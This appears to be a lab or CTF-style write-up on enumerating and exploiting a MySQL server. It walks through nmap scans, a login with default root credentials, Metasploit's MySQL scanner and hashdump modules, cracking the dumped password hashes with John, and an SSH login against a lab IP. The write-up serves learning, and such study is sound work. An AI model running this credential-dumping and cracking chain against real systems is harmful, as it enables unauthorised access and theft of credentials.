@@ -1,0 +1,266 @@
+
+MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL)
+
+
+
+
+![Pasted image 20241003122935](https://github.com/user-attachments/assets/e5d42868-e3d4-42b4-9dd1-a942e1d92bf8)
+
+
+Database: 
+
+A database is simply a persistent, organised collection of structured data
+
+RDBMS: 
+
+A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.
+
+SQL: 
+
+MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a client-server model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL
+
+
+
+![Pasted image 20241003123018](https://github.com/user-attachments/assets/ff3078a3-b693-4c73-b472-87c6c452d738)
+
+
+MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.
+
+The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:
+
+    MySQL creates a database for storing and manipulating data, defining the relationship of each table.
+    Clients make requests by making specific statements in SQL.
+    The server will respond to the client with whatever information has been requested.
+
+
+# Enumerating MySQL :
+
+
+### The Scenario:
+
+
+After fingerprinting the network, I was able to find some credentials: "root:password" , I conducted enumeration on subdomains of a web servers. After trying the login against SSH unsuccessfully, I decide to try it against MySQL. 
+
+Typically, in real world you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service.
+
+
+# NMAP:
+
+
+![Pasted image 20241003124855](https://github.com/user-attachments/assets/db6e2d27-aab5-4ac6-b7d6-cebb58c8d301)
+
+
+## OS detection, version detection, script scanning, and traceroute:
+
+nmap -A 10.10.137.40 -nvvv
+
+
+
+
+![Pasted image 20241003125145](https://github.com/user-attachments/assets/b6683923-409c-46e8-b9d9-a6598d0ed836)
+
+Note:
+
+Server version 5.x are susceptible to an user enumeration attack due to different messages during login when using old authentication mechanism from versions 4.x and earlier.
+####  Script mysql-enum:
+
+
+
+nmap -p 3306 --script=mysql-enum  10.10.137.40 -nvvv
+
+
+![Pasted image 20241003125810](https://github.com/user-attachments/assets/f5b14bf4-8305-4db6-9fc8-f40164af24a6)
+
+
+
+
+# Wireshark:
+
+
+![Pasted image 20241003132213](https://github.com/user-attachments/assets/2da4f9b4-8a19-4c67-bbad-b6378ecd38f1)
+
+### Detecting MYSQL anomalies, enumeration:
+
+
+
+
+![Pasted image 20241003130529](https://github.com/user-attachments/assets/3be37a48-f294-4ac0-9f68-55d8291deabe)
+
+
+version: 5.7.29-0ubuntu0.18.04.1
+
+
+![Pasted image 20241003130425](https://github.com/user-attachments/assets/bb29feff-64f0-4ca9-9b3d-4b67aeec79fa)
+
+## Many connections that never established "short duration":
+
+
+
+![Pasted image 20241003131447](https://github.com/user-attachments/assets/23904ef3-0b23-46f9-ab26-48f983c21771)
+
+
+
+
+![Pasted image 20241003131314](https://github.com/user-attachments/assets/89dc25a9-c835-42d8-b3f7-3b636c62149e)
+
+## Error number: 1043; Symbol: ER_HANDSHAKE_ERROR; SQLSTATE: 08S01
+
+
+
+
+![Pasted image 20241003131055](https://github.com/user-attachments/assets/7f009dfa-78d7-4192-a257-22dcc20601a8)
+
+
+## Error 1045: Access denied
+
+Error 1045 occurs when a user is denied permission to perform operations such as SELECT, INSERT, UPDATE, and DELETE on the database. Below is a list of some reasons why MySQL denies access and possible fixes.
+
+The user doesn’t exist. Check if the user exists in the database, and if they don’t, create a new user.
+
+The password is incorrect. To fix this, reset the MySQL password.
+
+Connecting to the wrong host. Double check that the host you’re connecting to is correct.
+
+### Installing MySQL client:
+
+
+![Pasted image 20241003132047](https://github.com/user-attachments/assets/4fd85a84-f4dd-48c9-9078-02ea74e3be64)
+
+
+sudo apt install default-mysql-client
+
+
+![Pasted image 20241003130002](https://github.com/user-attachments/assets/e164d2c0-88fa-407a-9486-bece70f5b3cb)
+
+
+
+mysql -h [IP] -u [username] -p"
+
+mysql -h 10.10.137.40 -u root -p "password"
+
+
+
+# Metasploit:
+
+
+
+
+![Pasted image 20241003132013](https://github.com/user-attachments/assets/146172de-0367-4580-a533-618019a14fb9)
+
+
+
+# mysql_version:
+
+
+The mysql_version module, as its name implies, scans a host or range of hosts to determine the version of MySQL that is running.
+
+```
+use auxiliary/scanner/mysql/mysql_version
+show options
+set RHOSTS 192.168.1.200-254
+set THREADS 20
+ run
+```
+
+
+### Scanner MySQL Auxiliary Modules:
+
+
+
+
+![Pasted image 20241003140152](https://github.com/user-attachments/assets/a29999ec-2daa-4f7a-b7aa-aee0750a4646)
+
+```
+use auxiliary/scanner/mysql/mysql_login
+show options
+set PASSWORD password
+set RHOSTS 10.10.137.40
+ set USERNAME root
+  run
+
+```
+
+
+![Pasted image 20241003140121](https://github.com/user-attachments/assets/7ad9f83d-7766-457a-809c-cd5b54d7e815)
+
+### Found remote MySQL version 5.7.29
+
+5.7.29-0ubuntu0.18.04.1
+
+
+![Pasted image 20241003135235](https://github.com/user-attachments/assets/f401a1bc-f174-4086-87ba-182a08fb0ffa)
+
+
+![Pasted image 20241003135217](https://github.com/user-attachments/assets/7e9a1046-8cdc-415c-99a3-68450304fc79)
+
+
+```
+
+set SQL show databases
+run
+```
+
+
+![Pasted image 20241003140442](https://github.com/user-attachments/assets/aac492e5-ab4b-464c-8312-ff9c76e02308)
+
+
+
+![Pasted image 20241003140525](https://github.com/user-attachments/assets/c37587b3-c779-4405-986d-4e52d198434a)
+
+
+
+# Exploiting MySQL:
+
+ 
+ At this point, I was able to gain more sensitive information than just database names:
+
+I know that :
+
+ MySQL server credentials
+ The version of MySQL running
+ The number of Databases, and their names.
+
+
+# Loading mysql_hashdump :
+
+
+auxiliary/scanner/mysql/mysql_hashdump 
+
+
+![Pasted image 20241003143211](https://github.com/user-attachments/assets/e0c232ad-5e27-45a8-8d1f-5a65e27c3d07)
+
+```
+
+set PASSWORD password
+set USERNAME  root
+set RHOTS 10.10.137.40
+
+```
+
+![Pasted image 20241003144109](https://github.com/user-attachments/assets/b3e71609-32e2-4725-8e8d-4f0c34a87bc1)
+
+
+# John the Reaper:
+
+
+![Pasted image 20241003145245](https://github.com/user-attachments/assets/b36c1cdc-2c3c-4577-8133-3451a333cda9)
+
+
+Cracking hashes with John:
+
+
+1. Copy all the hashes to a document.
+
+![Pasted image 20241003143819](https://github.com/user-attachments/assets/21b5a4ff-fe4f-43a4-904e-f456e21e04bd)
+
+
+john sql_hasdump.txt
+
+
+![Pasted image 20241003144501](https://github.com/user-attachments/assets/351dc81e-9087-4306-b3db-88ef14a57c8a)
+
+
+ssh carl@10.10.137.40
+
+
+![Pasted image 20241003144429](https://github.com/user-attachments/assets/920c8bd5-4e75-4d64-88cd-ca77503f2d9b)
